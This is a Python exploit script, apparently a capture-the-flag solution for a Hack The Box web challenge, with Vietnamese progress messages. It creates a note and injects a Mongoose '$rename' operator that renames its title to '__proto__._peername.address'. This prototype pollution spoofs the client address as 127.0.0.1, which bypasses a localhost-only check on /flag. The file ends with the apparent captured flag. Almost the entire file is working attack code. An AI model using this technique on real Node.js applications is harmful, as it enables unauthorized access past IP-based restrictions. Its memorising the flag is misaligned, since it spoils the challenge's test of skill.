import requests

BASE_URL = "http://localhost:1337"

def exploit():
    print("[*] Bước 1: Tạo note tạm...")
    res = requests.post(f"{BASE_URL}/create", json={
        "title": "Exploit", 
        "content": "Pending..."
    })
    note_id = res.json().get("_id")
    print(f"[+] Note đã được tạo với ID: {note_id}")

    print("[*] Bước 2: Chuẩn bị giá trị IP localhost...")
    # Lưu chuỗi IP 127.0.0.1 vào trường title
    requests.post(f"{BASE_URL}/update", json={
        "noteId": note_id,
        "title": "127.0.0.1"
    })

    print("[*] Bước 3: Trigger Prototype Pollution vào _peername...")
    # Mongoose sẽ đổi tên title thành Object.prototype._peername.address
    # Kết quả: Object.prototype._peername = { address: "127.0.0.1" }
    payload = {
        "noteId": note_id,
        "$rename": { "title": "__proto__._peername.address" }
    }
    res3 = requests.post(f"{BASE_URL}/update", json=payload)
    if res3.status_code == 200:
        print("[+] Đã đầu độc Socket properties thành công!")
    else:
        print(f"[-] Bước 3 thất bại: {res3.text}")
        return

    print("[*] Bước 4: Bypass localhost và lấy cờ!")
    # Lên thẳng endpoint /flag, Node.js sẽ bị lừa bởi _peername giả!
    res_flag = requests.get(f"{BASE_URL}/flag")
    
    if res_flag.status_code == 200:
        print(f"\n[🚀] BÙM! LẤY CỜ THÀNH CÔNG: {res_flag.text}")
    else:
        print(f"[-] Thất bại, server trả về: {res_flag.status_code} - {res_flag.text}")

if __name__ == "__main__":
    exploit()
    
# HTB{m0ng00s3_pr0t0typ3_p0llus10n_c0mb1n3d_w1th_1nt3rn4l_n0d3_g4dg3ts!}